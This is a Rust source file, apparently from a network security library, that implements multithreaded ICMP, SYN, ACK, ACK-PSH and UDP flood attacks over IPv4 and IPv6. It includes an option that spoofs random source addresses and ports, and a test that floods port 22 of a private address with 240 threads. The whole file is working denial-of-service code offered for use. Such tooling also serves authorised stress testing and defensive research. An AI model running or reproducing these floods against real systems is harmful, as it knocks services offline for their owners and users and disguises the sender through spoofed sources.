#[cfg(feature = "flood")]
use chrono::DateTime;
#[cfg(feature = "flood")]
use chrono::Local;
#[cfg(feature = "flood")]
use pnet::datalink::MacAddr;
#[cfg(feature = "flood")]
use pnet::datalink::NetworkInterface;
#[cfg(feature = "flood")]
use prettytable::Cell;
#[cfg(feature = "flood")]
use prettytable::Row;
#[cfg(feature = "flood")]
use prettytable::Table;
#[cfg(feature = "flood")]
use prettytable::row;
#[cfg(feature = "flood")]
use std::collections::BTreeMap;
#[cfg(feature = "flood")]
use std::fmt;
#[cfg(feature = "flood")]
use std::net::IpAddr;
#[cfg(feature = "flood")]
use std::net::Ipv4Addr;
#[cfg(feature = "flood")]
use std::net::Ipv6Addr;
#[cfg(feature = "flood")]
use std::sync::mpsc::channel;
#[cfg(feature = "flood")]
use std::thread;
#[cfg(feature = "flood")]
use std::time::Duration;
#[cfg(feature = "flood")]
use std::time::Instant;
#[cfg(feature = "flood")]
use tracing::error;

#[cfg(feature = "flood")]
pub mod icmp;
#[cfg(feature = "flood")]
pub mod icmpv6;
#[cfg(feature = "flood")]
pub mod tcp;
#[cfg(feature = "flood")]
pub mod tcp6;
#[cfg(feature = "flood")]
pub mod udp;
#[cfg(feature = "flood")]
pub mod udp6;

#[cfg(feature = "flood")]
use crate::NetInfo;
#[cfg(feature = "flood")]
use crate::error::PistolError;
#[cfg(feature = "flood")]
use crate::utils;

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct FloodReport {
    pub addr: IpAddr,
    pub send_packet: usize, // count
    pub send_size: usize,   // KB, MB or GB
    pub cost: Duration,
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct Flood {
    pub layer2_cost: Duration,
    pub flood_report: Option<FloodReport>,
    pub start_time: DateTime<Local>,
    pub finish_time: DateTime<Local>,
}

#[cfg(feature = "flood")]
impl Flood {
    pub(crate) fn new() -> Self {
        Self {
            layer2_cost: Duration::ZERO,
            flood_report: None,
            start_time: Local::now(),
            finish_time: Local::now(),
        }
    }
    pub(crate) fn finish(&mut self, flood_report: Option<FloodReport>) {
        self.finish_time = Local::now();
        self.flood_report = flood_report;
    }
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct Floods {
    pub layer2_cost: Duration,
    pub flood_reports: Vec<FloodReport>,
    pub start_time: DateTime<Local>,
    pub finish_time: DateTime<Local>,
}

#[cfg(feature = "flood")]
impl fmt::Display for Floods {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        const BYTES_PER_MB: u64 = 1024;
        const BYTES_PER_GB: u64 = 1024 * 1024;
        let mut table = Table::new();
        table.add_row(Row::new(vec![
            Cell::new("Flood Attack").style_spec("c").with_hspan(3),
        ]));
        table.add_row(row![c -> "id", c -> "addr", c -> "report"]);

        // sorted
        let mut btm_addr: BTreeMap<IpAddr, FloodReport> = BTreeMap::new();
        for report in &self.flood_reports {
            btm_addr.insert(report.addr, report.clone());
        }

        let mut i = 1;
        for (addr, report) in btm_addr {
            let time_cost = report.cost;
            let time_cost_str = utils::time_to_string(time_cost);
            let time_cost = time_cost.as_secs_f64();
            let (size_str, traffic_str) = if report.send_size as f64 / BYTES_PER_GB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_GB as f64;
                let k = v / time_cost;
                (format!("{:.2}GB", v), format!("{:.2}GB/s", k))
            } else if report.send_size as f64 / BYTES_PER_MB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_MB as f64;
                let k = v / time_cost;
                (format!("{:.2}MB", v), format!("{:.2}MB/s", k))
            } else {
                let v = report.send_size;
                let k = v as f64 / time_cost;
                (format!("{}Bytes", v), format!("{:.2}B/s", k))
            };
            let traffic_str = format!(
                "packets sent: {}({}), time cost: {}({})",
                report.send_packet, size_str, time_cost_str, traffic_str
            );

            let addr_str = format!("{}", addr);
            table.add_row(row![c -> i, c -> addr_str, c -> traffic_str]);
            i += 1;
        }

        let summary = format!(
            "start at: {}, finish at: {}",
            self.start_time.format("%Y-%m-%d %H:%M:%S"),
            self.finish_time.format("%Y-%m-%d %H:%M:%S"),
        );
        table.add_row(Row::new(vec![Cell::new(&summary).with_hspan(3)]));
        write!(f, "{}", table.to_string())
    }
}

#[cfg(feature = "flood")]
impl Floods {
    pub(crate) fn new() -> Floods {
        Floods {
            layer2_cost: Duration::ZERO,
            flood_reports: Vec::new(),
            start_time: Local::now(),
            finish_time: Local::now(),
        }
    }
    pub(crate) fn finish(&mut self, flood_reports: Vec<FloodReport>) {
        self.finish_time = Local::now();
        self.flood_reports = flood_reports;
    }
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

#[cfg(feature = "flood")]
fn ipv4_flood_thread(
    dst_mac: MacAddr,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    src_mac: MacAddr,
    src_ipv4: Ipv4Addr,
    src_port: u16,
    interface: &NetworkInterface,
    method: FloodMethods,
    threads: usize,
    retransmit: usize,
) -> Result<(usize, usize), PistolError> {
    let (tx, rx) = channel();
    for _ in 0..threads {
        let tx = tx.clone();
        let interface = interface.clone();
        thread::spawn(move || {
            let ret = match method {
                FloodMethods::Icmp => icmp::send_icmp_flood_packet(
                    dst_mac, dst_ipv4, src_mac, src_ipv4, &interface, retransmit,
                ),
                FloodMethods::Syn => tcp::send_syn_flood_packet(
                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::Ack => tcp::send_ack_flood_packet(
                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet(
                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::Udp => udp::send_udp_flood_packet(
                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                    retransmit,
                ),
            };
            let send_buff_size = match ret {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(e) => {
                    error!("{}", e);
                    0
                }
            };
            if let Err(e) = tx.send(send_buff_size) {
                error!("failed to send to tx on func ipv4_flood_thread: {}", e);
            }
        });
    }
    let iter = rx.into_iter().take(threads);
    let mut total_send_buff_size = 0;
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
    }
    Ok((threads * retransmit, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn ipv6_flood_thread(
    dst_mac: MacAddr,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    src_mac: MacAddr,
    src_ipv6: Ipv6Addr,
    src_port: u16,
    interface: &NetworkInterface,
    method: FloodMethods,
    threads: usize,
    retransmit: usize,
) -> Result<(usize, usize), PistolError> {
    let (tx, rx) = channel();
    for _ in 0..threads {
        let tx = tx.clone();
        let interface = interface.clone();
        thread::spawn(move || {
            let ret = match method {
                FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(
                    dst_mac, dst_ipv6, src_mac, src_ipv6, &interface, retransmit,
                ),
                FloodMethods::Syn => tcp6::send_syn_flood_packet(
                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::Ack => tcp6::send_ack_flood_packet(
                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet(
                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                    retransmit,
                ),
                FloodMethods::Udp => udp6::send_udp_flood_packet(
                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                    retransmit,
                ),
            };
            let send_buff_size = match ret {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(e) => {
                    error!("{}", e);
                    0
                }
            };
            if let Err(e) = tx.send(send_buff_size) {
                error!("failed to send to tx on func ipv6_flood_thread: {}", e);
            }
        });
    }
    let iter = rx.into_iter().take(threads);
    let mut total_send_buff_size = 0;
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
    }
    Ok((threads * retransmit, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn flood(
    net_infos: Vec<NetInfo>,
    method: FloodMethods,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    let mut pistol_floods = Floods::new();
    let (tx, rx) = channel();

    let mut recv_size = 0;
    for ni in net_infos {
        match ni.dst_addr {
            IpAddr::V4(dst_ipv4) => {
                for _ in 0..repeat {
                    for &dst_port in &ni.dst_ports {
                        let dst_mac = ni.dst_mac;
                        let src_mac = ni.src_mac;
                        let src_ipv4 = match fake_src {
                            true => utils::random_ipv4_addr(),
                            false => match ni.src_addr {
                                IpAddr::V4(src_ipv4) => src_ipv4,
                                _ => utils::random_ipv4_addr(),
                            },
                        };
                        let src_port = match fake_src {
                            true => utils::random_port(),
                            false => match ni.src_port {
                                Some(port) => port,
                                None => utils::random_port(),
                            },
                        };
                        let interface = ni.interface.clone();
                        let dst_addr = ni.dst_addr;

                        let tx = tx.clone();
                        thread::spawn(move || {
                            let start_time = Instant::now();
                            let ret = ipv4_flood_thread(
                                dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port,
                                &interface, method, threads, retransmit,
                            );
                            if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                                error!("failed to send to tx on func flood: {}", e);
                            }
                        });
                        recv_size += 1;
                    }
                }
            }
            IpAddr::V6(dst_ipv6) => {
                for _ in 0..repeat {
                    for &dst_port in &ni.dst_ports {
                        let dst_mac = ni.dst_mac;
                        let src_mac = ni.src_mac;
                        let src_ipv6 = match fake_src {
                            true => utils::random_ipv6_addr(),
                            false => match ni.src_addr {
                                IpAddr::V6(src_ipv6) => src_ipv6,
                                _ => utils::random_ipv6_addr(),
                            },
                        };
                        let src_port = match fake_src {
                            true => utils::random_port(),
                            false => match ni.src_port {
                                Some(port) => port,
                                None => utils::random_port(),
                            },
                        };
                        let interface = ni.interface.clone();
                        let dst_addr = ni.dst_addr;

                        let tx = tx.clone();
                        thread::spawn(move || {
                            let start_time = Instant::now();
                            let ret = ipv6_flood_thread(
                                dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port,
                                &interface, method, threads, retransmit,
                            );
                            if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                                error!("failed to send to tx on func flood: {}", e);
                            }
                        });
                        recv_size += 1;
                    }
                }
            }
        }
    }

    let iter = rx.into_iter().take(recv_size);
    let mut flood_reports = Vec::new();
    for (dst_addr, ret, start_time) in iter {
        let time_cost = start_time.elapsed();
        match ret {
            Ok((send_packet, send_size)) => {
                let flood_report = FloodReport {
                    addr: dst_addr,
                    send_packet,
                    send_size,
                    cost: time_cost,
                };
                flood_reports.push(flood_report);
            }
            Err(e) => return Err(e),
        }
    }
    pistol_floods.finish(flood_reports);
    Ok(pistol_floods)
}

#[cfg(feature = "flood")]
pub fn flood_raw(
    net_info: NetInfo,
    method: FloodMethods,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    let mut flood = Flood::new();
    let start = Instant::now();
    let dst_mac = net_info.dst_mac;
    let dst_addr = net_info.dst_addr;
    let src_mac = net_info.src_mac;
    let src_addr = net_info.src_addr;
    let src_port = net_info.src_port;
    let interface = &net_info.interface;
    match dst_addr {
        IpAddr::V4(dst_ipv4) => {
            let mut total_send_buff_size = 0;
            for _ in 0..repeat {
                let src_ipv4 = match fake_src {
                    true => utils::random_ipv4_addr(),
                    false => match src_addr {
                        IpAddr::V4(src_ipv4) => src_ipv4,
                        _ => utils::random_ipv4_addr(),
                    },
                };
                let src_port = match fake_src {
                    true => utils::random_port(),
                    false => match src_port {
                        Some(src_port) => src_port,
                        None => utils::random_port(),
                    },
                };

                for &dst_port in &net_info.dst_ports {
                    let ret = match method {
                        FloodMethods::Icmp => icmp::send_icmp_flood_packet(
                            dst_mac, dst_ipv4, src_mac, src_ipv4, &interface, retransmit,
                        ),
                        FloodMethods::Syn => tcp::send_syn_flood_packet(
                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::Ack => tcp::send_ack_flood_packet(
                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet(
                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::Udp => udp::send_udp_flood_packet(
                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
                            retransmit,
                        ),
                    };
                    let send_buff_size = match ret {
                        Ok(s) => s + 14, // Ethernet frame header length.
                        Err(e) => {
                            error!("{}", e);
                            0
                        }
                    };
                    total_send_buff_size += send_buff_size;
                }
            }
            let flood_report = FloodReport {
                addr: net_info.dst_addr,
                send_packet: retransmit * repeat,
                send_size: total_send_buff_size,
                cost: start.elapsed(),
            };
            flood.finish(Some(flood_report));
            Ok(flood)
        }
        IpAddr::V6(dst_ipv6) => {
            let mut total_send_buff_size = 0;
            for _ in 0..repeat {
                let src_ipv6 = match fake_src {
                    true => utils::random_ipv6_addr(),
                    false => match src_addr {
                        IpAddr::V6(src_ipv6) => src_ipv6,
                        _ => utils::random_ipv6_addr(),
                    },
                };
                let src_port = match fake_src {
                    true => utils::random_port(),
                    false => match src_port {
                        Some(src_port) => src_port,
                        None => utils::random_port(),
                    },
                };

                for &dst_port in &net_info.dst_ports {
                    let ret = match method {
                        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(
                            dst_mac, dst_ipv6, src_mac, src_ipv6, &interface, retransmit,
                        ),
                        FloodMethods::Syn => tcp6::send_syn_flood_packet(
                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::Ack => tcp6::send_ack_flood_packet(
                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet(
                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                            retransmit,
                        ),
                        FloodMethods::Udp => udp6::send_udp_flood_packet(
                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
                            retransmit,
                        ),
                    };
                    let send_buff_size = match ret {
                        Ok(s) => s + 14, // Ethernet frame header length.
                        Err(e) => {
                            error!("{}", e);
                            0
                        }
                    };
                    total_send_buff_size += send_buff_size;
                }
            }
            let flood_report = FloodReport {
                addr: net_info.dst_addr,
                send_packet: retransmit * repeat,
                send_size: total_send_buff_size,
                cost: start.elapsed(),
            };
            flood.finish(Some(flood_report));
            Ok(flood)
        }
    }
}

#[cfg(feature = "flood")]
pub fn icmp_flood(
    net_infos: Vec<NetInfo>,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        net_infos,
        FloodMethods::Icmp,
        threads,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(feature = "flood")]
pub fn icmp_flood_raw(
    net_info: NetInfo,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    flood_raw(net_info, FloodMethods::Icmp, retransmit, repeat, fake_src)
}

#[cfg(feature = "flood")]
pub fn tcp_syn_flood(
    net_infos: Vec<NetInfo>,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        net_infos,
        FloodMethods::Syn,
        threads,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_syn_flood_raw(
    net_info: NetInfo,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    flood_raw(net_info, FloodMethods::Syn, retransmit, repeat, fake_src)
}

#[cfg(feature = "flood")]
pub fn tcp_ack_flood(
    net_infos: Vec<NetInfo>,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        net_infos,
        FloodMethods::Ack,
        threads,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_flood_raw(
    net_info: NetInfo,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    flood_raw(net_info, FloodMethods::Ack, retransmit, repeat, fake_src)
}

#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood(
    net_infos: Vec<NetInfo>,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        net_infos,
        FloodMethods::AckPsh,
        threads,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood_raw(
    net_info: NetInfo,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    flood_raw(net_info, FloodMethods::AckPsh, retransmit, repeat, fake_src)
}

#[cfg(feature = "flood")]
pub fn udp_flood(
    net_infos: Vec<NetInfo>,
    threads: usize,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        net_infos,
        FloodMethods::Udp,
        threads,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(feature = "flood")]
pub fn udp_flood_raw(
    net_info: NetInfo,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Flood, PistolError> {
    flood_raw(net_info, FloodMethods::Udp, retransmit, repeat, fake_src)
}

#[cfg(feature = "flood")]
#[cfg(test)]
mod tests {
    use super::*;
    use crate::Pistol;
    use crate::Target;
    #[test]
    fn test_flood() {
        let dst_addr = Ipv4Addr::new(192, 168, 5, 5);
        let ports = Some(vec![22]);
        let target1 = Target::new(dst_addr.into(), ports);
        let targets = vec![target1];
        let threads = 240; // It can be simply understood as the number of attack threads.
        let retransmit = 480; // The number of times to repeat sending the same attack packet.
        let repeat = 4; // The number of times each thread repeats the attack.

        let mut pistol = Pistol::new();
        let (net_infos, dur) = pistol.init_runner(&targets, None, None).unwrap();
        let ret = tcp_syn_flood(net_infos, threads, retransmit, repeat, true).unwrap();
        println!("layer2: {:.2}s, {}", dur.as_secs_f32(), ret);
    }
}
